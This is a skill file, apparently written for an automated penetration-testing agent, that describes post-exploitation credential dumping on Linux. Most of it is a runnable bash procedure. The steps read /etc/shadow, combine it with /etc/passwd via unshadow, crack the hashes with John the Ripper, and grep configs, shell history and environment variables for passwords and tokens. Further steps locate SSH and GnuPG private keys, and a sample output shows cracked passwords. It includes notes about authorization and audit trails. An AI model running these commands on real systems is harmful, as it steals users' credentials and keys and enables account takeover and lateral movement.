---
name: credential-dump-linux
description: Extract password hashes and plaintext credentials from Linux
version: 1.0.0
phase: post
category: post-exploitation
tags: [linux, credentials, shadow, unshadow, john, passwords]
tools: [unshadow, john, grep]
difficulty: intermediate
opsec_level: high
time_estimate: 1m
severity_if_found: critical
related_skills:
  - credential-harvest
  - lateral-movement
mitre_attack:
  - T1003.008
  - T1552.001
---

## When to Use

Use this skill on compromised Linux systems to extract password hashes from
/etc/shadow and plaintext credentials from configuration files, history,
and environment variables.

## Prerequisites

- Root or read access to /etc/shadow
- unshadow, john (optional, for cracking)
- grep for searching config files

## Procedure

```bash
# 1. Extract /etc/shadow (requires root)
cat /etc/shadow 2>/dev/null | grep -v ":\*:" | grep -v ":!:"

# 2. Combine /etc/passwd and /etc/shadow for cracking
unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt 2>/dev/null
cat /tmp/hashes.txt

# 3. Crack hashes with John the Ripper
john /tmp/hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john /tmp/hashes.txt --show

# 4. Search for plaintext passwords in config files
grep -r "password" /etc/ 2>/dev/null | grep -v "shadow\|\.db\|Binary"
grep -r "password" /var/www/ /opt/ /home/ 2>/dev/null | head -30

# 5. Search bash history for passwords
cat /home/*/.bash_history 2>/dev/null | grep -iE "password|pass=|pwd=|mysql.*-p"

# 6. Search for SSH private keys
find /home/ -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
ls -la /home/*/.ssh/ 2>/dev/null

# 7. Extract environment variables with secrets
env | grep -iE "pass|key|token|secret"
cat /home/*/.bashrc /home/*/.profile 2>/dev/null | grep -iE "export.*pass\|export.*key"

# 8. Check for GnuPG keys
find /home/ -name "*.gpg" -o -name "secring.gpg" 2>/dev/null

# 9. Search for database connection strings
grep -r "mysql\|postgres\|redis\|mongo" /var/www/ /opt/ /etc/ 2>/dev/null | grep -i "pass\|pwd"
```

## OPSEC Rules

- **CRITICAL**: Do not exfiltrate cracked passwords during assessment
- Document hash format and crackability (time to crack)
- Do not modify /etc/shadow or /etc/passwd
- Log all searches for audit trail
- Clean up /tmp/hashes.txt after assessment
- Do not attempt to crack hashes without authorization

## Verification

- Confirm hash format (SHA-512, yescrypt, DES)
- Test cracked credentials against SSH or su
- Check if password is used for multiple services
- Verify no account lockout after failed attempts

## Pitfalls

- Some systems use yescrypt (john may not support older versions)
- /etc/shadow may be readable only by root
- Passwords may be hashed with strong algorithms (slow to crack)
- Some accounts use no password (disabled accounts)
- PAM configuration may prevent su/sudo with cracked credentials
- Root account may be locked (no password hash)

## Output Format

```
[CRED-DUMP] Linux credentials extracted
  Method: /etc/shadow + unshadow
  Target: web-server (10.0.1.5)
  Users found: 5
  Cracked: admin:password123 (SHA-512)
  Severity: CRITICAL

[CRED] Plaintext password found
  File: /var/www/html/config/database.php
  Line: $db_pass = "SuperSecret123"
  Severity: CRITICAL
```
